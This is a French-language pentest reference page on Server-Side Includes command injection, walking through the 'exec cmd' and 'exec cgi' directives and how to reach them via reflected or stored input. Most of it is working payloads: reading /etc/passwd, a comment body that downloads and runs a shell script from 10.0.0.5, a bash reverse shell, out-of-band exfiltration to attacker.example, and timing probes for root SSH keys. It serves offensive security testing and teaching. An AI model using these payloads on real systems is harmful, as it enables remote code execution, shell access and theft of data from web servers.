---
title: "Exécution de commandes SSI"
description: "La directive exec exécute des commandes du système d'exploitation lorsqu'une entrée attaquant atteint une page interprétée en SSI, transformant du balisage reflété en exécution de code à distance sous le compte du serveur web."
keywords:
  - SSI exec cmd
  - exécution de commandes SSI
  - shtml RCE
  - exec cmd id
  - RCE Server-Side Includes
---

# Exécution de commandes

La directive `exec` est la primitive SSI à plus fort impact : elle exécute une commande du système d'exploitation et insère la sortie standard de la commande dans la page. Lorsque l'entrée utilisateur atteint une page que le serveur interprète pour y chercher du SSI, une directive `exec` injectée s'exécute avec les privilèges du processus du serveur web, ce qui constitue une exécution de code à distance.

## La directive

Deux formes existent. `exec cmd` passe une chaîne au shell système (`/bin/sh -c` sous Unix), et `exec cgi` exécute un programme CGI par chemin virtuel.

```
<!--#exec cmd="id"-->
<!--#exec cmd="uname -a"-->
<!--#exec cgi="/cgi-bin/script.cgi"-->
```

Parce que `exec cmd` passe par le shell, toute la grammaire du shell est disponible à l'intérieur de la chaîne : pipes, redirections, séparateurs et substitution fonctionnent tous.

```
<!--#exec cmd="/bin/sh -c 'id; uname -a; cat /etc/passwd'"-->
<!--#exec cmd="cat /etc/passwd | head -n 5"-->
```

## Atteindre la directive

La charge utile doit apparaître dans un document que le serveur interprète comme du SSI. Les points d'entrée courants sont toute valeur stockée ou reflétée ensuite rendue dans une page avec le SSI activé : un nom de profil, le corps d'un commentaire, un User-Agent renvoyé dans une page d'état, un nom de fichier affiché dans une liste, ou un terme de recherche reflété sur une page de résultats `.shtml`.

```
User-Agent: <!--#exec cmd="id"-->
```

```
POST /comment HTTP/1.1
...

body=<!--#exec cmd="curl http://10.0.0.5/s.sh|sh"-->
```

Si le commentaire est stocké et que la page de modération ou d'affichage est en `.shtml`, la directive s'exécute lorsque cette page est générée.

## Confirmer l'exécution

Commencez par une commande dont la sortie est reconnaissable sans ambiguïté dans la réponse :

```
<!--#exec cmd="id"-->
```

Un `uid=33(www-data) gid=33(www-data)` reflété confirme à la fois l'exécution et le compte de service. À partir de là, passez à un point d'ancrage interactif complet.

```
<!--#exec cmd="/bin/sh -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'"-->
```

La gestion des guillemets importe quand le point d'injection se trouve déjà à l'intérieur d'un attribut HTML ou quand l'application supprime des caractères. Échangez les guillemets externes et internes au besoin, et repliez-vous sur `exec cgi`, qui exécute un programme CGI adressé par son chemin d'URL, si `cmd` est désactivé mais pas l'exécution CGI. Elle invoque un point d'accès CGI existant plutôt qu'un binaire arbitraire, ce qui la rend utile là où un script accessible traite une entrée influencée par l'attaquant :

```
<!--#exec cmd='id'-->
<!--#exec cgi="/cgi-bin/debug.cgi"-->
```

## Exécution aveugle

Quand la sortie de la commande n'est pas reflétée, provoquez plutôt un signal hors bande. Les rappels DNS et HTTP confirment l'exécution et transportent de petites quantités de données :

```
<!--#exec cmd="nslookup $(whoami).attacker.example"-->
<!--#exec cmd="curl http://attacker.example/$(id|base64 -w0)"-->
```

Les délais temporels donnent un oracle booléen lorsqu'aucune sortie réseau n'est disponible. Associez le délai à une condition pour qu'un temps de réponse mesuré réponde à une question oui-ou-non sur l'hôte :

```
<!--#exec cmd="sleep 10"-->
<!--#exec cmd="/bin/sh -c 'test -f /root/.ssh/id_rsa && sleep 10'"-->
```

Une réponse qui se bloque pendant dix secondes confirme que le fichier existe ; une réponse immédiate confirme qu'il n'existe pas. Boucler cela sur des noms de fichiers, des comptes utilisateur ou des suppositions de caractères extraits reconstruit les données sans aucune réflexion et sans aucune connexion sortante.

## Notes nginx et IIS

La grammaire des directives est portable, mais la configuration qui l'active diffère. nginx n'évalue le SSI que lorsque `ssi on` est défini pour la location et ne fournit pas d'équivalent `exec cmd` par défaut, donc `include` et `echo` y sont les primitives utilisables. `mod_include` d'Apache est l'endroit où `exec cmd` est le plus souvent accessible, conditionné par l'option `Includes` (par opposition à `IncludesNOEXEC`, qui conserve `echo` et `include` mais retire `exec`). Sous IIS, la directive `#exec` est désactivée dans les configurations par défaut et doit être explicitement activée, donc confirmez avec `echo` avant de supposer que l'exécution de commandes est disponible.

## Outils

- **Burp Suite** : injection et itération de directives SSI via Repeater et Intruder.
- **Burp Collaborator** : confirmation de l'exécution aveugle d'`exec` via des rappels DNS et HTTP.
- Tests manuels avec des charges utiles `<!--#exec cmd-->` forgées.

## Références

- [OWASP: Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
- [PayloadsAllTheThings: Server Side Inclusion / Edge Side Inclusion Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection)
